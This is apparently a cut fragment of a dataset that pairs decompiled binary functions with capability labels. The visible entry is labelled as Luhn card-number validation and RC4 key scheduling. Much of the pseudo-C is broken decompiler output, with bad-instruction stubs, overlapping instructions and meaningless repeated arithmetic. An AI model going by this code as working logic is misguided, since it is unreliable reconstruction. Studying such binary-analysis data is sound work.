*puVar20 + cVar11;\n            *puVar20 = *puVar20 + cVar11;\n            *puVar20 = *puVar20 + cVar11;\n        }\n        cVar11 = puVar20;\n        *in_stack_00000030 = *in_stack_00000030 + cVar11;\n        *puVar20 = *puVar20 + cVar11;\n        *puVar20 = *puVar20 + cVar11;\ncode_r0x0001400fdb45:\n        cVar11 = puVar20;\n        *puVar20 = *puVar20 + cVar11;\n        *in_stack_00000030 = *in_stack_00000030 + cVar11;\n        *puVar20 = *puVar20 + cVar11;\n        *puVar20 = *puVar20 + cVar11;\n    }\ncode_r0x0001400fdb4d:\n    cVar11 = puVar20;\n    *puVar20 = *puVar20 + cVar11;\n    *(puVar20 * 2) = *(puVar20 * 2) + cVar11;\n    *puVar20 = *puVar20 + cVar11;\n    *puVar20 = *puVar20 + cVar11;\n    *puVar20 = *puVar20 + cVar11;\ncode_r0x0001400fdb5a:\n    cVar11 = puVar20;\n    *puVar20 = *puVar20 + cVar11;\n    *puVar20 = *puVar20 + cVar11;\n    *puVar20 = *puVar20 + cVar11;\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 26848
    },
    "14007da5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0001401046b1) overlaps instruction at (ram,0x0001401046b0)\n// \n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t ** fcn.14007da50(int64_t **arg1, ulong noname_1, int64_t **arg3)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    uint16_t *puVar4;\n    ulong uVar5;\n    ulong noname_0;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint uVar30;\n    uint uVar31;\n    uint uVar32;\n    uint uVar33;\n    uint uVar34;\n    uint uVar35;\n    uint uVar36;\n    uint uVar37;\n    uint uVar38;\n    uint uVar39;\n    int64_t **ppiVar40;\n    int64_t **ppiVar41;\n    char cVar42;\n    uint8_t uVar43;\n    uint8_t uVar44;\n    uint8_t uVar45;\n    ushort uVar46;\n    int16_t iVar47;\n    int16_t iVar48;\n    uint16_t uVar49;\n    uint16_t uVar50;\n    uint32_t uVar51;\n    uint32_t uVar52;\n    char *pcVar53;\n    int16_t *piVar54;\n    int64_t *piVar55;\n    uchar *puVar56;\n    int64_t iVar57;\n    ulong uVar58;\n    uint64_t uVar59;\n    int64_t **ppiVar60;\n    uchar (*pauVar61) [16];\n    uint32_t *puVar62;\n    char *pcVar64;\n    char cVar65;\n    ulong *puVar66;\n    int64_t iVar67;\n    uint8_t uVar68;\n    int16_t *piVar69;\n    int64_t **ppiVar70;\n    uchar *puVar71;\n    int64_t **ppiVar72;\n    uint64_t uVar73;\n    int64_t **unaff_RBX;\n    int64_t **ppiVar74;\n    int64_t **ppiVar75;\n    uint *puVar76;\n    int64_t **ppiVar77;\n    int64_t **ppiVar78;\n    int64_t **ppiVar79;\n    int64_t **ppiVar80;\n    int64_t **ppiVar81;\n    int64_t **ppiVar82;\n    char cVar83;\n    int64_t *unaff_RBP;\n    bool bVar84;\n    int32_t iVar85;\n    int64_t **unaff_RSI;\n    uint8_t *puVar86;\n    int64_t **unaff_RDI;\n    uint8_t uVar87;\n    int64_t **ppiVar88;\n    uint8_t **in_R9;\n    int64_t in_R11;\n    int64_t **unaff_R12;\n    int64_t **unaff_R13;\n    int64_t **ppiVar89;\n    int64_t **unaff_R14;\n    int64_t **unaff_R15;\n    ushort in_FS;\n    int64_t in_FS_OFFSET;\n    int64_t in_GS_OFFSET;\n    bool bVar90;\n    uchar uVar91;\n    bool bVar92;\n    uchar auVar93 [16];\n    uint in_XMM1_Da;\n    uint in_XMM1_Db;\n    uint in_XMM1_Dc;\n    uint in_XMM1_Dd;\n    ulong *puVar94;\n    ushort *puVar95;\n    uint in_XMM3_Da;\n    uint in_XMM3_Db;\n    uint in_XMM3_Dc;\n    uint in_XMM3_Dd;\n    uint in_XMM4_Da;\n    uint in_XMM4_Db;\n    uint in_XMM4_Dc;\n    uint in_XMM4_Dd;\n    uint in_XMM5_Da;\n    uint in_XMM5_Db;\n    uint in_XMM5_Dc;\n    uint in_XMM5_Dd;\n    uint in_XMM6_Da;\n    uint in_XMM6_Db;\n    uint in_XMM6_Dc;\n    uint in_XMM6_Dd;\n    uint in_XMM7_Da;\n    uint in_XMM7_Db;\n    uint in_XMM7_Dc;\n    uint in_XMM7_Dd;\n    uint in_XMM8_Da;\n    uint in_XMM8_Db;\n    uint in_XMM8_Dc;\n    uint in_XMM8_Dd;\n    int64_t **in_stack_00000000;\n    int64_t *piStackX8;\n    uint *puStackX16;\n    ulong *puStackX32;\n    uchar (*in_stack_00000028) [16];\n    int64_t **in_stack_00000030;\n    int16_t iStack0000000000000038;\n    int64_t **in_stack_00000038;\n    uchar uStack0000000000000040;\n    unkbyte5 Stack0000000000000040;\n    uint8_t uStack0000000000000045;\n    char cStack0000000000000046;\n    uint32_t uStack0000000000000044;\n    int64_t **in_stack_00000040;\n    uint8_t in_stack_00000048;\n    uchar in_stack_00000049;\n    unkbyte6 in_stack_0000004a;\n    uint in_stack_00000054;\n    int64_t **in_stack_00000058;\n    int16_t iStack0000000000000060;\n    int64_t **in_stack_00000060;\n    uchar in_stack_00000068;\n    uchar in_stack_00000069;\n    unkbyte6 in_stack_0000006a;\n    uint in_stack_00000070;\n    ulong *in_stack_00000078;\n    int64_t **in_stack_00000080;\n    uchar in_stack_00000088;\n    unkbyte7 in_stack_00000089;\n    int64_t **in_stack_000000c8;\n    int64_t **in_stack_000000e8;\n    uint32_t *in_stack_00000110;\n    ulong in_stack_00000118;\n    ulong in_stack_000001e8;\n    int64_t **in_stack_000001f0;\n    int64_t in_stack_00000208;\n    ulong in_stack_00000220;\n    uchar auStack33927 [60];\n    uint8_t auStack33867 [33747];\n    ulong uStack120;\n    int64_t *piStack104;\n    uchar auStack96 [16];\n    int64_t iStack80;\n    int64_t *piStack56;\n    ulong uStack48;\n    uchar auStack40 [10];\n    ushort uStack30;\n    ulong *puStack24;\n    ushort *puStack16;\n    int32_t *piVar63;\n    \n    ppiVar78 = &piStack104;\n    ppiVar82 = &piStack104;\n    ppiVar75 = &piStack104;\n    ppiVar81 = &piStack104;\n    ppiVar72 = &piStack104;\n    ppiVar70 = &piStack104;\n    ppiVar80 = &piStack104;\n    puVar94 = *in_R9;\n    puVar95 = in_R9[1];\n    auVar93 = *in_stack_00000028;\n    uVar58 = SUB168(auVar93, 0);\n    puVar66 = 0x1400fdfd0;\n    uVar51 = in_stack_00000048 - 100 & 0xff;\n    puStack24 = puVar94;\n    puStack16 = puVar95;\n    uVar59 = *(uVar51 * 4 + 0x1400fdfd0);\n    _auStack40 = auVar93;\n    bVar90 = 0xfffffffebff0202f < uVar59;\n    ppiVar60 = uVar59 + 0x1400fdfd0;\n    bVar92 = ppiVar60 == NULL;\n    uVar43 = ppiVar60;\n    uVar52 = ppiVar60;\n    uVar68 = arg3 >> 8;\n    cVar42 = arg1;\n    uVar45 = ppiVar60 >> 8;\n    iVar85 = unaff_RDI;\n    uVar87 = arg1 >> 8;\n    ppiVar79 = &piStack104;\n    ppiVar77 = &piStack104;\n    ppiVar74 = &piStack104;\n    ppiVar40 = &piStack104;\n    ppiVar41 = &piStack104;\n    ppiVar88 = in_stack_00000038;\n    unaff_R13 = unaff_R13;\n    ppiVar89 = unaff_R14;\n    // switch table (44 cases) at 0x1400fdfd0\n    switch(uVar51) {\n    case 0:\n        (*(*arg3)[4])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 5:\n    case 6:\n    case 7:\n    case 8:\n    case 10:\n    case 0xb:\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x11:\n    case 0x12:\n    case 0x14:\n    case 0x15:\n        (*(*arg3)[7])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 9:\n        (*(*arg3)[6])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x10:\n        (*(*arg3)[3])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x13:\n        (*(*arg3)[5])(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x16:\n        (**(uVar59 + 0x1400fdfe8))(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x17:\n    case 0x18:\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n    case 0x24:\n    case 0x25:\n    case 0x27:\n    case 0x28:\n    case 0x2a:\n    case 0x2b:\n        (**(uVar59 + 0x1400fe000))(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x1f:\n        (**(uVar59 + 0x1400fdff8))(uVar58, arg1, arg3, &puStack24, auStack40);\n        return arg1;\n    case 0x26:\n        iVar67 = CONCAT71(0x1400fdf, *ppiVar60 + -0x30);\n        pcVar53 = iVar67 * 5 + -0x3e;\n        *pcVar53 = *pcVar53 + *ppiVar60 + -0x30;\n        goto code_r0x00014007dd2e;\n    case 0x29:\n        pauVar61 = ppiVar60 & 0xffffffffffffff90;\n        (*pauVar61)[0] = (*pauVar61)[0] + pauVar61;\n        auVar93 = *pauVar61;\n        ppiVar60 = in_stack_00000048 - 100;\n        iVar67 = 0x1400fe028;\n        arg3 = in_stack_00000030;\ncode_r0x00014007dd2e:\n        _auStack40 = auVar93;\n    // WARNING: Could not recover jumptable at 0x00014007dd4a. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (22 cases) at 0x1400fe028\n        ppiVar88 = (*(*(iVar67 + (ppiVar60 & 0xff) * 4) + iVar67))\n                             (SUB168(auVar93, 0), iVar67, arg3, in_stack_00000030, in_stack_00000038);\n        return ppiVar88;\n    case 0x2c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x2f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x30:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x31:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x32:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x33:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x34:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x35:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x36:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x37:\n    case 0x4a:\n    case 0xdf:\n        if (SCARRY8(uVar59, 0x1400fdfd0)) {\n            *ppiVar60 = *ppiVar60 + uVar43;\n            *(uVar59 + 0x1400fdfcb) = *(uVar59 + 0x1400fdfcb) + uVar68;\n        }\n        uVar59 = arg3 << 0x20 | ppiVar60 & 0xffffffff;\n        uVar59 = uVar59 % iVar85 << 0x20 | uVar59 / iVar85 & 0xffffff00U | *0xa0fff7fba0fff7fb;\n        uVar59 = uVar59 % iVar85 << 0x20 | uVar59 / iVar85 & 0xffffff00U | *0xa0fff7fba0fff7fb;\n        uVar59 = uVar59 % iVar85 << 0x20 | uVar59 / iVar85 & 0xffffff00U | *0x40fff7fba0fff7fb;\n        uVar59 = uVar59 % iVar85 << 0x20 | uVar59 / iVar85 & 0xffffff00U | *0xa0fff7fba0fff7fb;\n        uVar59 = uVar59 % iVar85 << 0x20 | uVar59 / iVar85 & 0xffffff00U | *0xa0fff7fba0fff7fb;\n        arg1 = arg1 & 0xffffffffffffff00;\n        uVar59 = uVar59 % iVar85 << 0x20 | uVar59 / iVar85 & 0xffffffffU;\n        uVar59 = uVar59 % iVar85 << 0x20 | uVar59 / iVar85 & 0xffffff00U | *0xe0fff7fba0fff7fb;\n        uVar73 = (uVar59 % iVar85 << 0x20 | uVar59 / iVar85 & 0xffffff00U | *0xb8fff7fba0fff7fb) % iVar85 & 0xffffffff;\n        uVar59 = func_0x0001290fd82e(uVar58);\n        uVar73 = (uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85 & 0xffffffff;\n        uVar59 = func_0x0001290fd836();\n        uVar73 = (uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85 & 0xffffffff;\n        uVar59 = func_0x0001290fd83e();\n        uVar73 = (uVar73 << 0x20 | uVar59 & 0xffffffff) % iVar85 & 0xffffffff;\n        uVar59 = func_0x0001290fd846();\n        uVar73 = uVar73 << 0x20 | uVar59 & 0xffffffff;\n        uVar59 = uVar73 / iVar85 & 0xffffffff;\n        uVar73 = uVar73 % iVar85 & 0xffffffff;\n        goto code_r0x0001400fe04e;\n    case 0x38:\n    case 0x55:\n    case 0xd0:\n    case 0xe0:\n    case 0xee:\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x39:\n    case 0x56:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3a:\n    case 0x57:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3b:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3c:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3d:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x3f:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x40:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x41:\n    case 0x5e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x42:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x43:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x44:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x45:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x46:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x47:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x48:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x49:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4b:\n        *ppiVar60 = *ppiVar60 + uVar43;\n        in_stack_00000040 = in_stack_00000040 & 0xffffffffffffff;\n        in_stack_00000028 = &stack0x00000058;\n        in_stack_00000068 = 0;\n        in_stack_00000000 = &stack0x00000068;\n        in_stack_00000060 = NULL;\n        in_stack_00000058 = in_stack_00000000;\n        if (*(piStack56 + 4) != '\\0') {\n            fcn.1400a3070(in_stack_00000028, 0x20);\n        }\n        in_stack_00000078 = &stack0x00000088;\n        puStackX32 = &stack0x00000078;\n        in_stack_00000080 = NULL;\n        in_stack_00000088 = 0;\n        puStack24 = in_stack_00000078;\n        fcn.1400a3070(puStackX32, 0x20);\n        uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff00ff;\n        uStack48 = uStack48 & 0xffffffff;\n        _auStack40 = CONCAT88(SUB168(_auStack40 >> 0x40, 0), piStack56 + 0x66) & 0xffffffffffffffff;\n        in_stack_00000054 = *(piStack56 + 0xc);\n        puStackX16 = &stack0x00000054;\n        unaff_RBX = NULL;\n        in_stack_00000040 = (uStack0000000000000044 & 0xff00ffff) << 0x20;\n        do {\n            if (*(puStackX16 + stack0xffffffffffffffe0) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014003b7b2. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppiVar88 = (*(*(*(puStackX16 + stack0xffffffffffffffe0) * 4 + 0x1400fe0fc) + 0x1400fe0fc))();\n                return ppiVar88;\n            }\n            uVar43 = 1;\ncode_r0x00014003ba8d:\n            uVar49 = unaff_RDI;\n            auVar93 = _auStack40 >> 0x40;\n            _auStack40 = CONCAT88(stack0xffffffffffffffe0 + 1, auStack40._0_8_);\n        } while ((SUB164(auVar93, 0) + 1 < 4 & uVar43) != 0);\n        if ((0x1 < unaff_RBX & uVar43) == 0) {\n            if (uVar43 == 0) {\ncode_r0x00014003bd35:\n                uVar43 = uVar49 == 0xffff;\n                goto code_r0x00014003bd3d;\n            }\njoined_r0x00014003c4d3:\n            if ((0x1 < in_stack_00000080) && (ppiVar88 = fcn.1400298f0(puStackX32, 0x30, 0),  ppiVar88 != NULL)) {\n                if (ppiVar88 == 0xffffffffffffffff) {\n                    ppiVar88 = in_stack_00000080 + -1;\n                    if (in_stack_00000080 == NULL) {\n                        *in_stack_00000078 = 0;\n                    }\n                    else if (ppiVar88 != NULL) goto code_r0x00014003c3a0;\n                }\n                else {\ncode_r0x00014003c3a0:\n                    ppiVar60 = in_stack_00000080;\n                    if (ppiVar88 <= in_stack_00000080) {\n                        ppiVar60 = ppiVar88;\n                    }\n                    fcn.1400a3120(puStackX32, 0, ppiVar60);\n                }\n            }\n            if ((cStack0000000000000046 != '\\0') && (*in_stack_00000078 != 0x30)) {\n                fcn.1400a1690(puStackX32, 0, 0, 1);\n            }\n            ppiVar88 = in_stack_00000060;\n            if (in_stack_00000060 != NULL) {\n                uStack48._4_1_ = uStack48 >> 0x20;\n                ppiVar60 = in_stack_00000060 + 1;\n                if (uStack0000000000000045 == '\\0') {\n                    uStack0000000000000040 = uStack48._4_1_;\n                }\n                if (in_stack_00000058 == in_stack_00000000) {\n                    ppiVar70 = 0xf;\n                }\n                else {\n                    ppiVar70 = CONCAT62(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068));\n                }\n                if (ppiVar70 < ppiVar60) {\n                    fcn.1400a3380(in_stack_00000028, in_stack_00000060, 0, 0);\n                }\n                *(in_stack_00000058 + ppiVar88) = uStack0000000000000040;\n                (in_stack_00000058 + 1)[ppiVar88] = 0;\n                in_stack_00000060 = ppiVar60;\n                cVar42 = fcn.1400b1590(piStack56[2], piStack56[3], in_stack_00000028);\n                if (cVar42 == '\\0') {\n                    *in_stack_00000110 = *in_stack_00000110 | 4;\n                }\n            }\n            uVar43 = uVar49 == 0xffff;\n            if ((uStack0000000000000045 != '\\0') && (*(piStack56 + 0xb) != uStack48 >> 0x20)) goto code_r0x00014003bd3d;\n            fcn.1400a18b0(in_stack_00000118, puStackX32);\n            bVar90 = arg1 != NULL && uVar43;\n            if (arg1 == NULL || !uVar43) goto code_r0x00014003bd58;\n        }\n        else {\n            if (cStack0000000000000046 == '\\0') {\n                unaff_R15 = piStack56[7];\n            }\n            else {\n                unaff_R15 = piStack56[9];\n            }\n            unaff_R14 = 0x1;\n            while( true ) {\n                bVar90 = unaff_RDI == -1;\n                unaff_R12 = bVar90;\n                bVar90 = arg1 != NULL && bVar90;\n                unaff_RSI = unaff_R12;\n                if (bVar90) {\n                    if (arg1[2] < arg1[3]) {\n                        iVar47 = *arg1[2];\n                    }\n                    else {\n                        iVar47 = (*(*arg1)[9])(arg1);\n                    }\n                    if (iVar47 == -1) {\n                        arg1 = NULL;\n                        unaff_RSI = bVar90;\n                    }\n                    else {\n                        unaff_RSI = NULL;\n                    }\n                }\ncode_r0x00014003b81b:\n                uVar43 = unaff_R12;\n                uVar49 = unaff_RDI;\n                bVar90 = unaff_RBP != NULL && uStack48._2_2_ == -1;\n                if (bVar90) break;\n                if ((uStack48._2_2_ == -1) == unaff_RSI) goto code_r0x00014003c0d8;\ncode_r0x00014003b83d:\n                if (unaff_RBX <= unaff_R14) goto code_r0x00014003c0d8;\n                uVar50 = uVar49;\n                if ((arg1 != NULL) && (uVar43 != 0)) {\n                    if (arg1[2] < arg1[3]) {\n                        uVar50 = *arg1[2];\n                    }\n                    else {\n                        uVar50 = (*(*arg1)[9])(arg1);\n                    }\n                    if (uVar50 == 0xffff) {\n                        arg1 = NULL;\n                    }\n                }\n                if (*(unaff_R15 + unaff_R14 * 2) != uVar50) goto code_r0x00014003bd3d;\n                if (arg1[2] < arg1[3]) {\n                    arg1[2] = arg1[2] + 2;\n                }\n                else {\n                    (*(*arg1)[10])(arg1);\n                }\n                unaff_R14 = unaff_R14 + 1;\n                unaff_RDI = 0xffffffff;\n            }\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar47 = *unaff_RBP[2];\n            }\n            else {\n                iVar47 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            if (iVar47 == -1) {\n                unaff_RBP = NULL;\n            }\n            if ((iVar47 == -1 && bVar90) != unaff_RSI) goto code_r0x00014003b83d;\ncode_r0x00014003c0d8:\n            if (unaff_R14 == unaff_RBX) goto joined_r0x00014003c4d3;\ncode_r0x00014003bd3d:\n            *in_stack_00000110 = *in_stack_00000110 | 4;\n            bVar90 = arg1 != NULL & uVar43;\n            if (bVar90 == false) goto code_r0x00014003bd58;\n        }\n        if (arg1[2] < arg1[3]) {\n            iVar47 = *arg1[2];\n        }\n        else {\n            iVar47 = (*(*arg1)[9])(arg1);\n        }\n        uVar43 = 0;\n        if (iVar47 == -1) {\n            arg1 = NULL;\n            uVar43 = bVar90;\n        }\ncode_r0x00014003bd58:\n        bVar90 = iStack0000000000000038 == -1;\n        if ((unaff_RBP != NULL) && (bVar90)) {\n            if (unaff_RBP[2] < unaff_RBP[3]) {\n                iVar47 = *unaff_RBP[2];\n            }\n            else {\n                iVar47 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n            }\n            bVar90 = iVar47 == -1;\n        }\n        if (bVar90 == uVar43) {\n            *in_stack_00000110 = *in_stack_00000110 | 2;\n        }\n        in_stack_000000e8[1] = in_stack_00000030 & 0xffffffffffff0000 | uVar49;\n        *in_stack_000000e8 = arg1;\n        if (in_stack_00000078 != puStack24) {\n            fcn.1400b64d0();\n        }\n        if (in_stack_00000058 != in_stack_00000000) {\n            fcn.1400b64d0();\n        }\n        return in_stack_000000e8;\n    case 0x4c:\ncode_r0x00014003b9fc:\n        uStack48 = uStack48 & 0xffffffff | uStack48._4_4_ + 1 << 0x20;\n        (in_stack_00000078 + 1)[unaff_RDI] = 0;\n        in_stack_00000080 = unaff_R12;\ncode_r0x00014003ba16:\n        piVar55 = arg1[2];\n        if (arg1[3] <= piVar55) goto code_r0x00014003bc6b;\ncode_r0x00014003ba24:\n        arg1[2] = piVar55 + 2;\n        do {\n            unaff_RDI = 0xffffffff;\n            bVar90 = arg1 != NULL;\n            if (bVar90) {\n                if (arg1[2] < arg1[3]) {\n                    iVar47 = *arg1[2];\n                }\n                else {\n                    iVar47 = (*(*arg1)[9])(arg1);\n                }\n                if (iVar47 == -1) {\n                    arg1 = NULL;\n                }\n                bVar90 = iVar47 == -1 && bVar90;\n            }\n            else {\n                bVar90 = true;\n            }\n            bVar92 = unaff_RBP != NULL && uStack48._2_2_ == -1;\n            ppiVar88 = unaff_RDI;\n            if (bVar92) {\n                if (unaff_RBP[2] < unaff_RBP[3]) {\n                    iVar47 = *unaff_RBP[2];\n                }\n                else {\n                    iVar47 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n                }\n                if (iVar47 == -1) {\n                    unaff_RBP = NULL;\n                }\n                if (bVar90 != (iVar47 == -1 && bVar92)) goto code_r0x00014003b985;\ncode_r0x00014003bd20:\n                uVar49 = ppiVar88;\n                unaff_RDI = ppiVar88;\n                uVar43 = 1;\njoined_r0x00014003bd2f:\n                if (in_stack_00000080 != NULL) goto code_r0x00014003ba8d;\n                goto code_r0x00014003bd35;\n            }\n            if (bVar90 == (uStack48._2_2_ == -1)) goto code_r0x00014003bd20;\ncode_r0x00014003b985:\n            if (arg1 == NULL) {\ncode_r0x00014003b993:\n                iVar47 = unaff_RDI;\n                ppiVar88 = unaff_RDI;\n            }\n            else {\n                bVar92 = false;\ncode_r0x00014003b98d:\n                if (bVar92) goto code_r0x00014003b993;\n                if (arg1[2] < arg1[3]) {\n                    iVar47 = *arg1[2];\n                }\n                else {\n                    iVar47 = (*(*arg1)[9])(arg1);\n                }\n                ppiVar88 = unaff_RDI;\n                if (iVar47 == -1) {\n                    arg1 = NULL;\n                }\n            }\n            unaff_RDI = in_stack_00000080;\n            ppiVar60 = in_stack_00000060;\n            uVar49 = ppiVar88;\n            do {\n                if (iVar47 == *auStack40._0_8_) {\n                    unaff_R12 = in_stack_00000080 + 1;\n                    uVar43 = *(*unaff_R15 + (auStack40._0_8_ - puStack16 >> 1));\n                    ppiVar88 = CONCAT71(in_stack_00000089, in_stack_00000088);\n                    if (in_stack_00000078 == puStack24) {\n                        ppiVar88 = 0xf;\n                    }\n                    if (ppiVar88 < unaff_R12) {\n                        fcn.1400a3380(puStackX32, in_stack_00000080, 0, 0);\n                    }\n                    *(in_stack_00000078 + unaff_RDI) = uVar43;\n                    goto code_r0x00014003b9fc;\n                }\n                auStack40._0_8_ = auStack40._0_8_ + 2;\n            } while (auStack40._0_8_ != unaff_RSI);\n            unaff_RDI = ppiVar88;\n            if (*(piStack56 + 0x22) == iVar47) {\n                uVar43 = uStack0000000000000045;\n                if (uStack0000000000000045 != 0) goto joined_r0x00014003bd2f;\n                if (*(piStack56 + 0xb) < 1) goto code_r0x00014003bd20;\n                _Stack0000000000000040 = CONCAT15(1, Stack0000000000000040);\n                uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff0000 | _Stack0000000000000040 >> 0x20;\n                uStack48 = uStack48 & 0xffffffff;\n                in_stack_00000040 = CONCAT44(uStack0000000000000044, uStack48._4_4_);\n                goto code_r0x00014003ba16;\n            }\n            if (*(piStack56 + 4) == 0) goto code_r0x00014003bd20;\n            uVar43 = *(piStack56 + 4);\n            if ((*(piStack56 + 0x24) != iVar47) || (uVar43 = uStack0000000000000045,  uStack0000000000000045 != 0))\n            goto joined_r0x00014003bd2f;\n            if (uStack48._4_4_ == 0) {\n                uVar43 = 0;\n                goto joined_r0x00014003bd2f;\n            }\n            ppiVar88 = in_stack_00000060 + 1;\n            if (in_stack_00000058 == in_stack_00000000) {\n                ppiVar70 = 0xf;\n            }\n            else {\n                ppiVar70 = CONCAT62(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068));\n            }\n            if (ppiVar70 < ppiVar88) {\n                fcn.1400a3380(in_stack_00000028, in_stack_00000060, 0, 0);\n            }\n            *(in_stack_00000058 + ppiVar60) = uStack48 >> 0x20;\n            uStack48 = uStack48 & 0xffffffff;\n            (in_stack_00000058 + 1)[ppiVar60] = 0;\n            piVar55 = arg1[2];\n            in_stack_00000060 = ppiVar88;\n            if (piVar55 < arg1[3]) goto code_r0x00014003ba24;\ncode_r0x00014003bc6b:\n            (*(*arg1)[10])(arg1);\n        } while( true );\n    case 0x4d:\n        in(arg3);\n        goto code_r0x00014003b98d;\n    case 0x4e:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x4f:\n        *(uVar59 + 0x1400fdfb6) = 0xf;\n        *0x6404f5ef6 = *0x6404f5ef6 + (uVar43 | *ppiVar60);\n        goto code_r0x00014003b81b;\n    case 0x50:\n        puStack16 = piStack56 + 100;\n        if (piStack56[8] == 0) {\n            in_stack_00000040 = in_stack_00000040 & 0xffffffffffffff;\n        }\n        else {\n            in_stack_00000040 = in_stack_00000040 & 0xffffffffffffff | (piStack56[10] != 0) << 0x38;\n        }\n        in_stack_00000068 = 0;\n        in_stack_00000058 = &stack0x00000068;\n        in_stack_00000060 = NULL;\n        if (*(piStack56 + 4) != '\\0') {\n            fcn.1400a3070(&stack0x00000058, 0x20);\n        }\n        in_stack_00000078 = &stack0x00000088;\n        in_stack_00000080 = NULL;\n        in_stack_00000088 = 0;\n        puStack24 = in_stack_00000078;\n        fcn.1400a3070(&stack0x00000078, 0x20);\n        uStack0000000000000044 = in_stack_00000040 >> 0x20 & 0xffff00ff;\n        _auStack40 = CONCAT88(SUB168(_auStack40 >> 0x40, 0), piStack56 + 0x66) & 0xffffffffffffffff;\n        in_stack_00000054 = *(piStack56 + 0xc);\n        in_stack_00000040 = (uStack0000000000000044 & 0xff00ffff) << 0x20;\n        ppiVar70 = &piStack104;\n        do {\n            if (*(*(ppiVar70 + 0x78) + *(ppiVar70 + 0x48)) < 5) {\n    // WARNING: Could not recover jumptable at 0x00014003a472. Too many branches\n    // WARNING: Treating indirect jump as call\n                ppiVar88 = (*(*(*(*(ppiVar70 + 0x78) + *(ppiVar70 + 0x48)) * 4 + 0x1400fe110) + 0x1400fe110))();\n                return ppiVar88;\n            }\n            unaff_R14 = 0x1;\ncode_r0x00014003a74d:\n            uVar50 = unaff_RDI;\n            iVar67 = *(ppiVar70 + 0x48);\n            *(ppiVar70 + 0x48) = iVar67 + 1;\n            uVar43 = unaff_R14;\n        } while ((iVar67 + 1 < 4 & uVar43) != 0);\n        if ((1 < *(ppiVar70 + 0x60) & uVar43) != 